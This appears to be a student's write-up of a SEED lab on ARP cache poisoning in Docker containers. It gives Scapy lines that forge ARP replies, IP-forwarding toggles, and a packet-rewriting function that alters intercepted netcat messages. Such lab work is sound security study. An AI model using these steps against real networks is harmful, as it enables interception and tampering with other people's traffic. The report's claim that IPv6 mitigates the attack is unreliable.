AITM Lab 2 Report: ARP Cache Poisoning & MITM Attack
Academic Year 2025-2026

Lab Environment Setup
Three Docker containers deployed using SEED Labsetup (docker compose up -d):

Host A: 10.9.0.5, MAC: 02:42:0a:09:00:05

Host B: 10.9.0.6, MAC: 02:42:0a:09:00:06

Host M (Attacker): 10.9.0.105, MAC: 02:42:0a:09:00:69

`docker exec -it <name> bash` showing containers, 
`ip link` Confirming MACs/interfaces, 
initial `arp -n` Baseline ARP tables clean.
![Setup](setup.png)
![Empty A ARP](A1.png)
![A Interface & MAC](A2.png)
![Empty B ARP](B1.png)
![B Interface & MAC](B2.png)
![Empty M ARP](M1.png)
![M Interface & MAC](M2.png)
Baseline Verification: Pings A→B/M, B→A/M populated legitimate ARP tables:


A: `10.9.0.6 → 02:42:0a:09:00:06` (real B_MAC)
B: `10.9.0.5 → 02:42:0a:09:00:05` (real A_MAC)
Post-ping `arp -n` tables.
![Ping & A ARP](A3.png)
![Ping & B ARP](B3.png)
![Ping & M ARP](M3.png)


Task 1: ARP Cache Poisoning Attack
From M, deployed continuous ARP reply attacks (op=2, most reliable ):
​

**Poison A** - Lies to A (B_IP → M_MAC):
```python
pkt = Ether(dst=A_MAC)/ARP(op=2, psrc=B_IP, pdst=A_IP, hwsrc=M_MAC)
![Poison A Script](poisonAScript.png)
```

**Poison B** - Lies to B (A_IP → M_MAC):
```python
pkt = Ether(dst=B_MAC)/ARP(op=2, psrc=A_IP, pdst=B_IP, hwsrc=M_MAC)
![Poison B Script](poisonBScript.png)
```

Results (`python3 poisonA.py & python3 poisonB.py`):
![Run Poison A & B Scripts](runPoisonScripts.png)

**A**: `10.9.0.6 → 02:42:0a:09:00:69` (M_MAC!) 
**B**: `10.9.0.5 → 02:42:0a:09:00:69` (M_MAC!) 
![A ARP Poison](AARPPoison.png)
![B ARP Poison](BARPPoison.png)

`tcpdump -i eth0 -n` confirms spoofed packets every 5s.
![A Traffic](ATraffic.png)
![B Traffic](BTraffic.png)


**Task 1**: Used ARP Reply packets (op=2) for reliable cache poisoning—victims blindly accept replies mapping victim IPs to attacker's MAC 

---
**Task 2**: MITM Validation (Ping Tests)
IP Forwarding OFF (`sysctl net.ipv4.ip_forward=0`):
![M Stop Traffic](MStop.png)

***A→B*** ping fails (packets reach M, dropped)
![A Ping B Stop](APingBStop.png)

tcpdump shows ICMP to M_MAC
![M Traffic](MTraffic.png)

IP Forwarding ON (`sysctl net.ipv4.ip_forward=1`):
![M Continue Traffic](MContinue.png)

***A↔B*** pings succeed (M transparently forwards)
![M Stop Traffic](APingContinue.png)

**Task** 3: Netcat MITM Attack
Setup: **B:** `nc -l -p 9090`, **A:** `nc 10.9.0.6 9090` (Connection Establishes).
![A NetCat setup](ANetCat1.png)
![B NetCat setup](BNetCat1.png)​
![B Receive Real Msg](BNetCat2.png)

Attack (`sysctl net.ipv4.ip_forward=0`, `run mitm_nc.py`):
![M NetCat Script](netCatScript.png)
![M NetCat Script Run](netCatScriptRun.png)

```python
def spoof(pkt):
  if pkt[IP].src==IPA and pkt[IP].dst==IPB and TCP in pkt:
    data=bytes(pkt[TCP].payload.load)
    newdata=data.replace(b"Marwan",b"AAAAAA")  # Same length!
    newpkt=IP(src=IPA,dst=IPB)/TCP(...)/Raw(newdata)
    send(newpkt)
```

***Proofs:***
- A types: "Hello Marwan testing" → B receives: "Hello AAAAAA testing"
- MITM Complete: M intercepts/modifies traffic invisibly after poisoning
- TCP Sequence Preservation: "Marwan"(6)→"AAAAAA"(6) maintains seq# integrity.

![A Send Msg To B](ANetCat2.png)
![B Receive Modified Msg](BNetCatModified.png)

***Conclusion***
- Successfully implemented ARP poisoning → bidirectional MITM → content modification using Scapy/netcat. Attack demonstrates why ARP lacks security (no authentication/spoof protection). Modern mitigation: Static ARP, DHCP Snooping, or IPv6.
